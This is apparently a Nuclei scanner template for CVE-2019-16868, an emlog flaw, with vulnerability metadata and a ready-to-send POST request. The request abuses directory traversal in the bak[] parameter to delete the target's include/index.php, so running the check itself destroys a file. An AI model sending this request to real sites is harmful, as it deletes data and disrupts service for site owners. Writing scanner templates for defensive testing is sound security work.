id: CVE-2019-16868

info:
  name: Arbitrary File Deletion in emlog via admin/data.php
  author: ProjectDiscoveryAI
  severity: critical
  description: emlog through 6.0.0beta has an arbitrary file deletion vulnerability via an admin/data.php?action=dell_all_bak request with directory traversal sequences in the bak[] parameter.
  impact: |
    High - Attackers can delete critical files leading to data loss or service disruption.
  remediation: |
    Apply the official patch provided by emlog to fix the vulnerability.
  reference:
    - https://github.com/emlog/emlog/issues/48
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-16868
    cwe-id: CWE-22
    epss-score: 0.00708
    epss-percentile: 0.81015
    cpe: cpe:2.3:a:emlog:emlog:*:*:*:*:*:*:*:*
  metadata:
    vendor: emlog
    product: emlog
    fofa-query: title="emlog"

http:
  - method: POST
    path:
      - "{{BaseURL}}/emlog/admin/data.php?action=dell_all_bak"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
      Referer: "{{BaseURL}}/emlog/admin/data.php"

    body: |
      bak%5B%5D=../include/index.php
    matchers:
      - type: status
        status:
          - 200
